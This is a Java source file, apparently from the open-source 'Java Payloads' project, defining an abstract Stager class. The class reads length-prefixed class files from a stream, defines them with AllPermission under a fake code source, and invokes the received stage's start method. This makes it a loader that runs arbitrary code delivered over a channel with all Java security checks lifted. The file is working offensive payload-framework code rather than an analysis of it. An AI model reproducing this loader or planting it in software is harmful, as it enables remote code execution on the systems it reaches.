/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.stager;

import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.URL;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;

public abstract class Stager extends ClassLoader {

	protected final void bootstrap(InputStream rawIn, OutputStream out, String[] parameters) {
		try {
			final DataInputStream in = new DataInputStream(rawIn);
			Class clazz;
			int length = in.readInt();
			do {
				final byte[] classfile = new byte[length];
				in.readFully(classfile);
				clazz = define(classfile);
				length = in.readInt();
			} while (length > 0);
			final Object stage = clazz.newInstance();
			clazz.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class }).invoke(stage, new Object[] { in, out, parameters });
		} catch (final Throwable t) {
			t.printStackTrace(new PrintStream(out, true));
		}
	}
	
	protected final Class define(byte[] classfile) throws IOException {
		final Permissions permissions = new Permissions();
		permissions.add(new AllPermission());
		final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
		Class clazz = defineClass(null, classfile, 0, classfile.length, pd);
		resolveClass(clazz);
		return clazz;
	}

	public abstract void bootstrap(String[] parameters, boolean needWait) throws Exception;
	public abstract void waitReady() throws InterruptedException;
}
